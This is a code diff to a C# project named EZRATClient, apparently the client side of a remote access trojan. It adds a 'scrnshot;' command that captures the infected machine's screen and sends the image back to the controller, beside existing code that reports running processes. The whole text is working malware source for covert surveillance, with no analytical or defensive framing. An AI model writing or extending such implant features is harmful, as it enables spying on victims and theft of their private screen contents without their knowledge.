@@ -12,6 +12,7 @@ using System.Security.Cryptography;
 using EZRATClient.Utils;
 using EZRATClient.Forms;
 using System.Diagnostics;
+using System.Drawing.Imaging;
 
 namespace EZRATClient
 {
@@ -326,6 +327,14 @@ namespace EZRATClient
                     result += $"{proc[i].ProcessName}¦{proc[i].Id};";
                 }
                 SendCommand(result);
+            }else if(text == "scrnshot;")
+            {
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    ScreenUtils.ScreenShot().Save(ms, ImageFormat.Png);
+                    string result = "scrnshot;" + Encoding.Default.GetString(ms.ToArray());
+                    SendCommand(result);
+                }
             }
         }
 
